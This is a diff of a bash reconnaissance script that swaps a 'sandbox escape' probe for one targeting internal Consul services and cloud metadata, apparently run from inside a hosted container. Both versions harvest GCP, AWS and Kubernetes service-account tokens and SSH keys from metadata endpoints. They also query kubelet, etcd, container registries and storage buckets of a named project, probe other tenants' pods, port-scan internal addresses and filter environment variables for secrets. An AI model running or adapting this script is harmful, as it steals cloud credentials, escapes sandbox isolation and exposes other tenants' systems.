@@ -1,96 +1,66 @@
 #!/bin/bash
-echo "=== V5: SANDBOX ESCAPE ==="
+echo "=== V6: INTERNAL SERVICES + CONSUL + AWS ==="
 date -u; hostname
 
-MD="http://169.254.169.254/computeMetadata/v1"
+echo "=== 1. CONSUL ELASTICSEARCH ==="
+echo "-- DNS resolve --"
+nslookup lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul 2>&1
+echo "-- direct HTTP --"
+curl -sv -m 10 "http://lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul:10150/" 2>&1 | head -c 3000; echo
+echo "-- try without port --"
+curl -s -m 5 "http://lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul/" 2>&1 | head -c 1000; echo
+
+echo "=== 2. CONSUL SERVICE DISCOVERY ==="
+echo "-- consul DNS SRV --"
+dig SRV lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul 2>&1; echo
+echo "-- consul agent API --"
+curl -s -m 5 "http://consul.service.consul:8500/v1/catalog/services" 2>&1 | head -c 2000; echo
+echo "-- consul nodes --"
+curl -s -m 5 "http://consul.service.consul:8500/v1/catalog/nodes" 2>&1 | head -c 2000; echo
+echo "-- resolve consul --"
+nslookup consul.service.consul 2>&1
+nslookup consul.service.nj1sbx.consul 2>&1
+
+echo "=== 3. MORE CONSUL SERVICES ==="
+for svc in elasticsearch redis mysql postgres kafka rabbitmq vault nomad traefik grafana prometheus; do
+  echo -n "$svc.service.consul -> "
+  nslookup "$svc.service.consul" 2>&1 | grep -i "address" | tail -1
+  echo -n "$svc.service.nj1sbx.consul -> "
+  nslookup "$svc.service.nj1sbx.consul" 2>&1 | grep -i "address" | tail -1
+done
+
+echo "=== 4. AWS METADATA ==="
+echo "-- AWS IMDSv1 --"
+curl -s -m 5 "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 1000; echo
+echo "-- AWS IMDSv2 token --"
+AWSTOK=$(curl -s -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>&1)
+echo "aws_token: $AWSTOK"
+echo "-- AWS IMDSv2 meta --"
+curl -s -m 5 -H "X-aws-ec2-metadata-token: $AWSTOK" "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 1000; echo
+echo "-- AWS creds --"
+curl -s -m 5 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>&1 | head -c 500; echo
+
+echo "=== 5. CLOUD METADATA VARIANTS ==="
+echo "-- Azure IMDS --"
+curl -s -m 5 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -c 1000; echo
+echo "-- GCP recursive instance --"
 MH="Metadata-Flavor: Google"
-TOKEN=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
+curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true" 2>&1 | head -c 5000; echo
+echo "-- GCP recursive project --"
+curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/project/?recursive=true" 2>&1 | head -c 2000; echo
+echo "-- GCP SSH keys --"
+curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys" 2>&1 | head -c 2000; echo
+curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys" 2>&1 | head -c 2000; echo
 
-echo "=== 1. NODE IP + KUBELET API ==="
-NODE_IP=$(curl -s -m 5 -H "$MH" "$MD/instance/network-interfaces/0/ip")
-echo "node_ip: $NODE_IP"
-curl -s -m 5 -H "$MH" "$MD/instance/network-interfaces/0/access-configs/0/external-ip" 2>&1; echo
-echo "-- kubelet 10250 --"
-curl -sk -m 5 "https://$NODE_IP:10250/pods" 2>&1 | head -c 2000; echo
-echo "-- kubelet 10255 readonly --"
-curl -s -m 5 "http://$NODE_IP:10255/pods" 2>&1 | head -c 2000; echo
-echo "-- kubelet healthz --"
-curl -sk -m 5 "https://$NODE_IP:10250/healthz" 2>&1; echo
-echo "-- kubelet runningpods --"
-curl -sk -m 5 "https://$NODE_IP:10250/runningpods/" 2>&1 | head -c 2000; echo
-echo "-- kubelet with SA token --"
-K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-curl -sk -m 5 -H "Authorization: Bearer $K8S" "https://$NODE_IP:10250/pods" 2>&1 | head -c 3000; echo
-
-echo "=== 2. CONTAINER REGISTRY ==="
-echo "-- gcr.io catalog --"
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://gcr.io/v2/_catalog" 2>&1 | head -c 1000; echo
-echo "-- gcr.io project --"
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://gcr.io/v2/yextenv-sbx/tags/list" 2>&1 | head -c 1000; echo
-echo "-- us.gcr.io --"
-curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://us.gcr.io/v2/yextenv-sbx/tags/list" 2>&1 | head -c 1000; echo
-
-echo "=== 3. GCS KNOWN BUCKETS ==="
-for bucket in artifacts.yextenv-sbx.appspot.com us.artifacts.yextenv-sbx.appspot.com yextenv-sbx yextenv-sbx-terraform yextenv-sbx-backups yextenv-sbx-data; do
-  RESP=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/$bucket/o?maxResults=3")
-  echo "$bucket -> $RESP"
-  if [ "$RESP" = "200" ]; then
-    curl -s -m 5 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/$bucket/o?maxResults=3" 2>&1 | head -c 2000; echo
-  fi
+echo "=== 6. INTERNAL NETWORK ==="
+for target in "10.192.32.1:443" "10.192.32.1:8080" "10.192.32.1:6443" "10.192.32.10:53"; do
+  IP=$(echo $target | cut -d: -f1)
+  PORT=$(echo $target | cut -d: -f2)
+  echo -n "$target -> "
+  timeout 2 bash -c "echo >/dev/tcp/$IP/$PORT" 2>&1 && echo "OPEN" || echo "closed"
 done
 
-echo "=== 4. CROSS-TENANT HTTP ==="
-for ip in 10.192.33.158 10.192.46.217 10.192.36.214 10.192.41.129 10.192.37.122; do
-  echo "--- $ip ---"
-  echo -n "CBD:1234 "; curl -s -m 3 -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" "http://$ip:1234/" 2>&1; echo
-  echo -n "Git:7263 "; curl -s -m 3 -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" "http://$ip:7263/" 2>&1; echo
-  echo -n "Init:1212 "; curl -s -m 3 -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" "http://$ip:1212/" 2>&1; echo
-done
-
-echo "=== 5. CROSS-TENANT VIA DNS ==="
-NS=live-preview-sbx
-for sid in 032945ae 223c1f9d 3abe0e96 3b26058e; do
-  echo -n "live-preview-$sid.$NS.svc -> "
-  nslookup "live-preview-$sid.$NS.svc.cluster.local" 2>&1 | grep -i address | tail -1
-done
-
-echo "=== 6. PROJECT METADATA ==="
-curl -s -m 5 -H "$MH" "$MD/project/attributes/?recursive=true" 2>&1 | head -c 3000; echo
-echo "-- all SAs recursive --"
-curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/?recursive=true" 2>&1 | head -c 2000; echo
-echo "-- instance tags --"
-curl -s -m 5 -H "$MH" "$MD/instance/tags" 2>&1; echo
-echo "-- disks --"
-curl -s -m 5 -H "$MH" "$MD/instance/disks/?recursive=true" 2>&1 | head -c 1000; echo
-
-echo "=== 7. INTERNAL SERVICES ==="
-K8S_HOST=$KUBERNETES_SERVICE_HOST
-echo "k8s_host: $K8S_HOST"
-echo -n "etcd 2379: "; curl -sk -m 3 "https://$K8S_HOST:2379/version" 2>&1 | head -c 300; echo
-echo -n "apiserver 8080: "; curl -s -m 3 "http://$K8S_HOST:8080/api" 2>&1 | head -c 300; echo
-
-echo "=== 8. EXTERNAL REACHABILITY ==="
-echo -n "internet: "; curl -s -m 5 -o /dev/null -w "HTTP %{http_code}" "https://httpbin.org/ip" 2>&1; echo
-echo -n "dns: "; nslookup google.com 2>&1 | grep -i address | tail -1
-
-echo "=== 9. RAW SOCKET ==="
-python3 -c "
-import socket
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    s.settimeout(2)
-    print('RAW SOCKET: CREATED')
-    s.close()
-except PermissionError:
-    print('RAW SOCKET: denied')
-except Exception as e:
-    print(f'RAW SOCKET: {e}')
-" 2>&1
-
-echo "=== 10. PROCESSES ==="
-for pid in 1 $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -20); do
-  CMD=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 100)
-  [ -n "$CMD" ] && echo "PID $pid: $CMD"
-done
+echo "=== 7. ENV (filtered) ==="
+env | grep -iE 'consul|elastic|redis|kafka|vault|aws|azure|mongo|mysql|postgres|rabbit|internal|proxy|gateway|traefik' | sort
 
 echo "=== DONE ==="
